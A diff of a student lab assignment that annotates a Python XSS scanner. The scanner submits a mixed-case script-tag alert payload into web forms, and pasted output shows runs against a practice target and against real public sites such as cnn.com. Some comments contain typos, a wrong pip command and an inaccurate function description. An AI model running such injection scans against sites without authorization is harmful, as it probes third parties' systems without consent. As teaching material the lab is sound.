@@ -6,7 +6,8 @@
 # Modified by: TODO: Mario Pugh
 
 ### TODO: Install requests bs4 before executing this in Python3
-
+### pip3 install request bs4
+ 
 # Import libraries
 
 import requests
@@ -17,13 +18,13 @@ from urllib.parse import urljoin
 # Declare functions
 
 ### TODO: Add function explanation here ###
-### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
+### This function gets all of the forms froooom the HTML content of the web page ###
 def get_all_forms(url):
     soup = bs(requests.get(url).content, "html.parser")
     return soup.find_all("form")
 
 ### TODO: Add function explanation here ###
-### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
+### Returns a list of forms as soup objects, may need to extract every form from detils and attributes ###
 def get_form_details(form):
     details = {}
     action = form.attrs.get("action").lower()
@@ -39,7 +40,7 @@ def get_form_details(form):
     return details
 
 ### TODO: Add function explanation here ###
-### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
+### After we got the form details, this function submits any given form. The function takes form_details which is the output of get_form_details() function, it accepts the url   in which  the original HTML form was put and the value that is set                                        to   every test or search input field. ###
 def submit_form(form_details, url, value):
     target_url = urljoin(url, form_details["action"])
     inputs = form_details["inputs"]
@@ -58,11 +59,12 @@ def submit_form(form_details, url, value):
         return requests.get(target_url, params=data)
 
 ### TODO: Add function explanation here ###
-### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
+### With the ready functions to extract all from a web page and submit them, tttttthis function scans for the XSS vulnerability ###
 def scan_xss(url):
     forms = get_all_forms(url)
     print(f"[+] Detected {len(forms)} forms on {url}.")
-    js_script = ### TODO: Add HTTP and JS code here that will cause a XSS-vulnerable field to create an alert prompt with some text.
+    js_script = "<Script>alert('hi')</scripT>"
+    # returning value
     is_vulnerable = False
     for form in forms:
         form_details = get_form_details(form)
@@ -77,7 +79,7 @@ def scan_xss(url):
 # Main
 
 ### TODO: Add main explanation here ###
-### In your own words, describe the purpose of this main as it relates to the overall objectives of the script ###
+### Given a URL this grabs all thhe HTML forms and then print the number of forms detected. Iterates all over the forms and submits the form with putting the value of all text and search input fields with a Javascript code. If the JS code is injected and successfully executed it shows that the web page is XSS vulnerable. ###
 if __name__ == "__main__":
     url = input("Enter a URL to test for XSS:") 
     print(scan_xss(url))
@@ -85,3 +87,29 @@ if __name__ == "__main__":
 ### TODO: When you have finished annotating this script with your own comments, copy it to Web Security Dojo
 ### TODO: Test this script against one XSS-positive target and one XSS-negative target
 ### TODO: Paste the outputs here as comments in this script, clearling indicating which is positive detection and negative detection
+
+# dojo@dojo-VirtualBox:~/Desktop/class-38$ python3 Ops38.py 
+# Enter a URL to test for XSS:http://dvwa.com
+# [+] Detected 0 forms on http://dvwa.com.
+# False
+# dojo@dojo-VirtualBox:~/Desktop/class-38$ python3 Ops38.py 
+# Enter a URL to test for XSS:https://www.codefellows.org
+# [+] Detected 0 forms on https://www.codefellows.org.
+# False
+# dojo@dojo-VirtualBox:~/Desktop/class-38$ python3 Ops38.py 
+# Enter a URL to test for XSS:https://www.cnn.com
+# [+] Detected 2 forms on https://www.cnn.com.
+# False
+
+# dojo@dojo-VirtualBox:~/Desktop/class-38$ python3 Ops38.py 
+# Enter a URL to test for XSS:https://xss-game.appspot.com/level1/frame
+# [+] Detected 1 forms on https://xss-game.appspot.com/level1/frame.
+# [+] XSS Detected on https://xss-game.appspot.com/level1/frame
+# [*] Form details:
+# {'action': '',
+# 'inputs': [{'name': 'query',
+#             'type': 'text',
+#             'value': "<Script>alert('it hit')</scripT>"},
+#             {'name': None, 'type': 'submit'}],
+# 'method': 'get'}
+# True
